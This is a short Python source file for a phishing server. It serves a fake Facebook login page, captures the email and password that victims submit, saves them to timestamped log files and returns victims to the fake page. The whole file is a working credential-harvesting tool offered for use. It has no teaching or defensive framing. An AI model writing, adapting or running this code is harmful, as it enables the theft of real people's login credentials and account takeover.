# phishing_server.py

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os
from datetime import datetime

HOST = "0.0.0.0"
PORT = 8080
LOG_DIR = "logs"

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.serve_html("fake_facebook.html")
        else:
            self.send_error(404, "File Not Found")

    def do_POST(self):
        if self.path == "/":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode()
            parsed_data = urllib.parse.parse_qs(post_data)

            username = parsed_data.get("email", [""])[0]
            password = parsed_data.get("pass", [""])[0]

            self.log_credentials(username, password)
            self.serve_html("fake_facebook.html")  # Redirect back to fake login
        else:
            self.send_error(404, "Invalid POST target")

    def serve_html(self, filename):
        try:
            with open(filename, "rb") as file:
                content = file.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, f"{filename} not found")

    def log_credentials(self, username, password):
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_filename = os.path.join(LOG_DIR, f"log_{now}.txt")
        with open(log_filename, "w") as f:
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
        print(f"[+] Captured credentials saved to {log_filename}")

if __name__ == "__main__":
    print(f"[*] Starting phishing server at http://{HOST}:{PORT}")
    httpd = HTTPServer((HOST, PORT), PhishingHandler)
    httpd.serve_forever()

